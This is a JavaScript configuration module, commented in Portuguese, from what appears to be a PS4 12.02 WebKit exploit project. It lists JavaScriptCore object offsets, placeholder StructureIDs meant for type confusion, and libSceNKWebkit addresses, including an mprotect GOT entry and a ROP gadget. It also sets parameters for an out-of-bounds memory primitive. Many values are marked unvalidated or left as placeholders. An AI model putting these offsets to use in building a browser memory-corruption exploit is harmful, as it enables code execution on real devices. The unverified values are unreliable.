// js/config.mjs

// Firmware: PS4 12.02
// OFFSETS VALIDADOS/REFINADOS COM BASE NA ANÁLISE DE DISASSEMBLY (ArrayBuffer.txt, JSON.txt, m_type...)
export const JSC_OFFSETS = {
    JSCell: {
        // Estes são os offsets DENTRO de uma JSCell, que é o cabeçalho base para todos os objetos JS.
        // O StructureID identifica o tipo e o layout do objeto.
        // Se o StructureID está diretamente na célula:
        STRUCTURE_ID_OFFSET: 0x00,       // Offset do StructureID (uint32_t) dentro da JSCell. (VALIDADO)
        FLAGS_OFFSET: 0x04,            // Offset das Flags (uint32_t) dentro da JSCell. (VALIDADO)
        // Se, em vez disso, a JSCell contém um ponteiro para uma estrutura Structure separada:
        // STRUCTURE_POINTER_OFFSET: 0x8,   // Offset do ponteiro para a Structure (Structure*) dentro da JSCell. (Alternativa a ser validada)
                                         // Por agora, vamos trabalhar com StructureID direto na célula.
    },

    Structure: {
        // Offsets DENTRO do objeto JSC::Structure (se STRUCTURE_POINTER_OFFSET for usado).
        // Estes precisam de validação profunda com seus binários. O construtor em m_type e m_structureID.txt ajuda.
        // TYPE_INFO_TYPE_OFFSET: 0x0A, // Ex: [StructureBase + 0xA] poderia ser o tipo dentro da TypeInfo
        // CLASS_INFO_OFFSET: 0x30,      // Ex: [StructureBase + 0x30] poderia ser ClassInfo*
        // PROTOTYPE_OFFSET: 0x08,       // Ex: [StructureBase + 0x08] poderia ser o protótipo
    },

    JSObject: {
        // Se JSCell tem 8 bytes (ID + Flags), o Butterfly (para propriedades/elementos) viria depois.
        BUTTERFLY_OFFSET: 0x08, // CANDIDATO, se JSCell tem 8 bytes. Se JSCell tiver 16 (com vtable e Structure*), então 0x10. VALIDAR!
                                // O seu core_exploit.mjs original usava jscOffsets.js_butterfly = 0x8;
    },

    ArrayBuffer: {
        // Offsets relativos ao início do objeto JSArrayBuffer (que começa com uma JSCell).
        // Validado com base em ArrayBuffer.txt.

        // Ponteiro para a estrutura interna ArrayBufferContents* (m_impl).
        // [JSArrayBuffer_base + 0x10]
        CONTENTS_IMPL_POINTER_OFFSET: 0x10,

        // Offset do *tamanho* (byteLength) do buffer, relativo ao início do JSArrayBuffer.
        // Análise de JSObjectGetArrayBufferByteLength: m_impl = JSArrayBufferBase[0x10]; size = m_impl[0x20].
        // Portanto, size = JSArrayBufferBase[0x10 + 0x20] = JSArrayBufferBase[0x30]
        SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START: 0x30,

        // Offset do *ponteiro para os dados brutos* (dataPointer), relativo ao início do JSArrayBuffer.
        // Análise de JSObjectGetArrayBufferBytesPtr: m_impl = JSArrayBufferBase[0x10]; dataPtr = m_impl[0x10].
        // Portanto, dataPtr = JSArrayBufferBase[0x10 + 0x10] = JSArrayBufferBase[0x20]
        DATA_POINTER_OFFSET_FROM_JSARRAYBUFFER_START: 0x20,

        // Offsets DENTRO de ArrayBufferContents (se você tiver um ponteiro para ArrayBufferContents):
        // ArrayBufferContents_DataPtrOffset: 0x10,
        // ArrayBufferContents_SizeOffset: 0x20,
    },

    ArrayBufferView: { // Como DataView, Uint8Array, etc. (Objeto que "vê" um ArrayBuffer)
                       // Herda de JSCell.
        STRUCTURE_ID_OFFSET: 0x00,           // No início da JSCell da View
        FLAGS_OFFSET: 0x04,                  // No início da JSCell da View
        // Após o cabeçalho JSCell (ex: 8 bytes), vêm os campos específicos da View:
        ASSOCIATED_ARRAYBUFFER_OFFSET: 0x08, // Ponteiro para o JSArrayBuffer associado.
        M_VECTOR_OFFSET: 0x10,               // Ponteiro para os dados (geralmente o dataPointer do ArrayBuffer associado + byteOffset da view).
        M_LENGTH_OFFSET: 0x18,               // Comprimento da view (em elementos para TypedArrays, em bytes para DataView).
        M_MODE_OFFSET: 0x1C                  // Modo (ex: WastefulWriting, Aliased).
    },

    JSFunction: {
        // Herda de JSCell.
        M_EXECUTABLE_OFFSET: "0x20", // VALIDAR
        M_SCOPE_OFFSET: "0x28",      // VALIDAR
    },

    SymbolObject: {
        // Herda de JSCell.
        PRIVATE_SYMBOL_POINTER_OFFSET: 0x10, // VALIDAR
    }
};

// !! PREENCHA ESTES COM VALORES HEXADECIMAIS REAIS DOS SEUS BINÁRIOS !!
// Obtenha-os analisando o código de criação de objetos ou tabelas de Structure.
export const KNOWN_STRUCTURE_IDS = {
    // Estes são exemplos, os valores reais são necessários.
    TYPE_ARRAY_BUFFER: "0xYOUR_ACTUAL_ARRAYBUFFER_ID",  // Ex: "0x07000100" (valor hipotético)
    TYPE_UINT8_ARRAY:  "0xYOUR_ACTUAL_UINT8ARRAY_ID", // Para TypedArrays
    TYPE_DATAVIEW:     "0xYOUR_ACTUAL_DATAVIEW_ID",
    TYPE_JS_FUNCTION:  "0xYOUR_ACTUAL_JSFUNCTION_ID",
    TYPE_JS_OBJECT_GENERIC: "0xYOUR_ACTUAL_JSOBJECT_ID", // Objeto comum {}
    TYPE_JS_STRING:    "0xYOUR_ACTUAL_JSSTRING_ID",
    // Adicione outros que você encontrar e achar úteis para type confusion:
    TYPE_JS_ARRAY:     "0xYOUR_ACTUAL_JSARRAY_ID",
    TYPE_FINAL_OBJECT: "0xYOUR_ACTUAL_FINALOBJECT_ID", // Um tipo de objeto simples sem propriedades indexadas
                                                       // (pode ser o mesmo que JS_OBJECT_GENERIC inicialmente)
    TYPE_FAKE_TARGET_FOR_CONFUSION: "0xYOUR_ACTUAL_TARGET_ID", // Um tipo que tem vtable ou ponteiros de função em offsets conhecidos
};

// Estes são do seu dump anterior, valide-os para PS4 12.02 se for usá-los.
export const WEBKIT_LIBRARY_INFO = {
    MODULE_NAME: "libSceNKWebkit.sprx",
    KNOWN_OFFSETS: {},
    GOT_ENTRIES: { "mprotect": "0x3CBD820" },
    FUNCTION_OFFSETS: {
        "JSC::JSFunction::create": "0x58A1D0",
        "JSC::Structure::Structure_constructor": "0x1638A50",
        "WTF::fastMalloc": "0x1271810",
        "WTF::fastFree": "0x230C7D0",
        "gadget_lea_rax_rdi_plus_20_ret": "0x58B860",
        // ... (mantenha outros offsets que você já validou)
    }
};

// Configuração para a primitiva OOB, pode ser ajustada pela UI
export let OOB_CONFIG = {
    ALLOCATION_SIZE: 32768,
    BASE_OFFSET_IN_DV: 128,
    INITIAL_BUFFER_SIZE: 32 // Não usado diretamente por core_exploit.mjs atual, mas presente no config original
};

export function updateOOBConfigFromUI(docInstance) {
    if (!docInstance || typeof docInstance.getElementById !== 'function') {
        // console.warn("updateOOBConfigFromUI: docInstance inválido ou getElementById não é função.");
        return;
    }
    try {
        const oobAllocSizeEl = docInstance.getElementById('oobAllocSize');
        const baseOffsetEl = docInstance.getElementById('baseOffset');
        // const initialBufSizeEl = docInstance.getElementById('initialBufSize'); // Removido se não usado

        if (oobAllocSizeEl && oobAllocSizeEl.value !== undefined) {
            const val = parseInt(oobAllocSizeEl.value, 10);
            if (!isNaN(val) && val > 0) OOB_CONFIG.ALLOCATION_SIZE = val;
        }
        if (baseOffsetEl && baseOffsetEl.value !== undefined) {
            const val = parseInt(baseOffsetEl.value, 10);
            if (!isNaN(val) && val >= 0) OOB_CONFIG.BASE_OFFSET_IN_DV = val;
        }
        // if (initialBufSizeEl && initialBufSizeEl.value !== undefined) {
        //     const val = parseInt(initialBufSizeEl.value, 10);
        //     if (!isNaN(val) && val > 0) OOB_CONFIG.INITIAL_BUFFER_SIZE = val;
        // }
    } catch (e) {
        console.warn("Erro ao atualizar OOB_CONFIG da UI:", e.message);
    }
}
